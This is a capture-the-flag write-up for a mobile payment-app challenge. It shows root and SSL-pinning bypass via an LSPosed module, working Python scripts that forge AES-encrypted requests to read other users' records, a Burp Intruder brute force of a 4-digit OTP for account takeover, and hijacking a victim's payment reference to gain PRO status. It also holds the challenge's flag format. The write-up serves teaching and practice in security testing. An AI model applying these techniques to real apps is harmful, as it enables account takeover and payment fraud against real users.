# KundalikPay

| Field | Value |
|-------|-------|
| Category | Mobile |
| Points | ? |

## Description

> KundalikPay — reach pro user level in this payment app and retrieve the flag.
>
> Given: `kundalikpay.apk`
> Requires: Rooted device + Magisk + LSPosed

## Solution

# KundalikPay — CTF Writeup

**Category:** Mobile + Web API  **|**  **Given:** `kundalikpay.apk`  **|**  **Goal:** `GET /api/v1/account/reward`

---

## Attack Chain

1. Bypass SSL pinning + root detection via LSPosed module → intercept traffic with Burp
2. Forge AES-encrypted blob with any user ID → leak PRO user phone numbers (Encrypted IDOR)
3. `otp-dispatch` returns 500 but saves OTP → brute-force 4-digit code → account takeover (ATO)
4. Call `/subscription/activate` as victim → steal `txn_ref` → use it with your own credentials on `/subscription/confirm` (BAC)
5. `GET /api/v1/account/reward` → **flag**

---

## Tools

`jadx` · `apktool` · `Burp Suite` · `Python 3` (`requests`, `cryptography`) · Rooted device with Magisk + LSPosed

---

## Part 1 — Static Analysis

```bash
jadx -d out kundalikpay.apk
apktool d kundalikpay.apk -o res_out
```

Most classes are obfuscated. Three stay readable — they appear in the manifest or are required for JNI symbol lookup:

```
uz.kundalikpay.ui.ServerConfigActivity        ← first-launch IP:port screen
uz.kundalikpay.security.NativeSecurityBridge  ← JNI bridge, method names intact
```

**First launch:** the app shows a screen asking for the server IP and port. The organizers provide these. Enter them once — the URL is saved to SharedPreferences and never asked again unless you clear app data.

**API endpoints from the binary:**

```bash
strings extracted/lib/arm64-v8a/libkundalikpay_native.so | grep "api/v1"
# api/v1/account/sync
# api/v1/ledger/basic
# api/v1/ledger/premium
```

The remaining endpoints appear in Burp once you use the app:
`/gateway/enroll` · `/gateway/authenticate` · `/gateway/otp-dispatch` · `/gateway/otp-verify` · `/subscription/activate` · `/subscription/confirm` · `/account/reward`

---

## Part 2 — Bypass Security

`NativeSecurityBridge.kt` (not obfuscated — names must match JNI symbols) exposes:

```kotlin
external fun nativeRootCheck(): Int          // su, Magisk, Frida thread scan
external fun verifyCertificatePin(...): Boolean  // SPKI SHA-256 check
external fun verifyApkSignature(...): Boolean    // signature vs hardcoded hash
external fun computeRequestSig(deviceId: String): String
```

The `Sc` class calls all four. Any failure → `Process.killProcess()`.

### LSPosed Module

Install `network-helper.apk` (provided alongside the APK) → open **LSPosed Manager** → enable **Network Helper** → scope it to `uz.kundalikpay` → reboot.

The module blocks `libkundalikpay_native.so` from loading entirely and replaces every JNI method with safe return values: root check → `0`, pin check → `true`, signature check → `true`, self-kill → no-op. SSL pinning is gone.

### Burp Setup

```
Proxy → Options → listener 0.0.0.0:8080
Device Wi-Fi → Manual proxy → <your IP>:8080
Install Burp CA cert from http://<burp-host>:8080/cert
```

---

## Part 3 — Required Headers

Every captured request has four custom headers:

```
X-Client: mobile-app  |  X-Device-ID: <uuid>
X-App-Version: 1.0.0  |  X-KP-Sig: <hex>
```

**Easiest approach:** copy all four headers straight from any live Burp request and reuse them — they stay valid for a short window. Keep your device ID consistent across all requests in the same session.

---

## Part 4 — Register, Login, First Look

Register via `POST /api/v1/gateway/enroll` (`msisdn` + `secret`) → get `uid`. If `uid=11`, ten users are already seeded. Login via `/gateway/authenticate` → `bearer` token. Hitting `/account/reward` immediately returns `403` — PRO required.

---

## Part 5 — Encrypted IDOR

### The Blob

`POST /api/v1/ledger/basic` and `/premium` accept a single JSON field `blob`. From jadx (`CryptoSession` / `Cx` class):

```
plaintext = device_id + "|" + bearer_token + "|" + ref
blob      = Base64( random_IV[16] || AES-256-CBC( session_key, IV, PKCS7(plaintext) ) )
```

`ref` is the user ID to look up. The session key comes from `GET /api/v1/account/sync` → field `token` → base64-decode → first 32 bytes.

### The Bug

The server decrypts the blob, splits on `|`, and queries `WHERE id = ref` — **no check that `ref` equals the authenticated user's own ID**. Since you hold the session key, you encrypt any `ref` you want.

### encrypt.py

```python
#!/usr/bin/env python3
"""
encrypt.py — forge an encrypted profile-request blob.

Usage:
    python3 encrypt.py <session_key_b64> <device_id> <bearer_token> <ref_id>

  session_key_b64 : the "token" value returned by GET /api/v1/account/sync
  device_id       : your X-Device-ID header value
  bearer_token    : your Authorization Bearer token
  ref_id          : the user ID you want to read (integer)

Example:
    python3 encrypt.py "LJA8LI5g3AY...XA==" "3f8a1b2c-..." "eyJhbG..." 6

Output: base64 blob — paste as the "blob" field in POST /api/v1/ledger/basic or /premium
"""

import sys, os, base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def pkcs7_pad(data: bytes, block: int = 16) -> bytes:
    pad = block - (len(data) % block)
    return data + bytes([pad] * pad)

def encrypt_blob(session_key_b64: str, device_id: str, token: str, ref: int) -> str:
    # unescape JSON unicode sequences (e.g. \u003d -> =) just in case
    session_key_b64 = session_key_b64.encode().decode("unicode_escape")
    # session key: base64-decode the full SHA-512 output, take first 32 bytes
    key       = base64.b64decode(session_key_b64)[:32]
    plaintext = pkcs7_pad(f"{device_id}|{token}|{ref}".encode())
    iv        = os.urandom(16)
    enc = Cipher(algorithms.AES(key), modes.CBC(iv),
                 backend=default_backend()).encryptor()
    ct  = enc.update(plaintext) + enc.finalize()
    return base64.b64encode(iv + ct).decode()

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print(__doc__); sys.exit(1)
    session_key_b64, device_id, token, ref = sys.argv[1:]
    print(encrypt_blob(session_key_b64, device_id, token, int(ref)))
```

### decrypt.py

```python
#!/usr/bin/env python3
"""
decrypt.py — decrypt a captured profile-request blob.

Usage:
    python3 decrypt.py <session_key_b64> <blob_base64>

  session_key_b64 : the "token" value returned by GET /api/v1/account/sync
  blob_base64     : the "blob" value captured in Burp from POST /api/v1/ledger/*

Example:
    python3 decrypt.py "LJA8LI5g3AY...XA==" "Rpktyu5HdOh...zhg=="

Output: device_id|bearer_token|ref
"""

import sys, base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def pkcs7_unpad(data: bytes) -> bytes:
    return data[: -data[-1]]

def decrypt_blob(session_key_b64: str, blob_b64: str) -> str:
    # unescape JSON unicode sequences (e.g. \u003d -> =) that appear when
    # copying blob values directly from browser devtools or JSON responses
    blob_b64 = blob_b64.encode().decode("unicode_escape")
    # session key: base64-decode the full SHA-512 output, take first 32 bytes
    key = base64.b64decode(session_key_b64)[:32]
    raw = base64.b64decode(blob_b64)
    iv, ct = raw[:16], raw[16:]
    dec = Cipher(algorithms.AES(key), modes.CBC(iv),
                 backend=default_backend()).decryptor()
    return pkcs7_unpad(dec.update(ct) + dec.finalize()).decode()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(__doc__); sys.exit(1)
    print(decrypt_blob(sys.argv[1], sys.argv[2]))
```

**Workflow:**

1. Get session key: `GET /api/v1/account/sync` → copy the `token` field value directly
2. Verify the format: grab any `blob` from Burp while the app loads your own profile, run `decrypt.py` — you should see `<your_device_id>|<your_token>|<your_uid>`
3. Enumerate IDs 1–10: run `encrypt.py` with `ref=1..10` → POST to `/ledger/basic` then `/ledger/premium` → read the JSON

Result — users 1–5 are `free` (5,000 balance). Users 6–10 are `pro` (30,000–250,000 balance, `flag_read=True`). Their flags are spent. You need to become PRO yourself. Their phone numbers are the next key.

---

## Part 6 — OTP 500 Quirk + Account Takeover

```bash
POST /api/v1/gateway/otp-dispatch   {"msisdn": "+998905555555"}
# → HTTP 500  {"detail": "OTP vaqtincha ishlamaydi"}
```

500 — "temporarily unavailable". But the response arrives instantly and there is no exception in the server logs. The OTP **was generated and saved**. The 500 is hardcoded. Now brute-force `/otp-verify` — 4 digits, no lockout, no rate limit:

```bash
# Burp Intruder → Sniper attack on "pin" field
# Payload: Numbers 0000–9999 (zero-padded, 4 digits)
# Thread: 20 · no delay
# Stop on: HTTP 200
```

Average ~5,000 attempts, ~100 seconds. The 200 response contains a `bearer` token for the victim. You now own their account.

---

## Part 7 — Broken Access Control → Free PRO

Upgrading to PRO is two steps.

**Step 1** — while still authenticated as the victim (balance ≥ 25,000 required), call:

```
POST /api/v1/subscription/activate
Authorization: Bearer <victim_token>
```
```json
← {"txn_ref": "f47ac10b-58cc-4372-a567-0e02b2c3d479"}
```

Copy the `txn_ref`. You only needed the victim's token for this one call.

**Step 2** — switch back to **your own** token and call `/confirm` with the stolen `txn_ref` and your own phone number:

```
POST /api/v1/subscription/confirm
Authorization: Bearer <your_token>
```
```json
→ {"txn_ref": "f47ac10b-...", "msisdn-sub": "+998901234567"}
← {"status": "PRO faollashtirildi...", "tier": "pro"}
```

The server verifies that `msisdn-sub` matches the authenticated user's phone ✓, and that `txn_ref` exists and is in `"initiated"` state ✓ — but **never checks that `txn_ref` belongs to the authenticated user**. You used the victim's payment session to upgrade your own account for free.

Your account is now PRO.

---

## Part 8 — Flag

```bash
GET /api/v1/account/reward
Authorization: Bearer <your_token>

← {"payload": "CHC{ApK_P3nT35T_N0T_H4RD_US3R_48291}", "status": "Flag muvaffaqiyatli o'qildi"}
```

The five digits are randomly generated at read time — every player gets a unique flag.


## Flag

`CHC{...}`
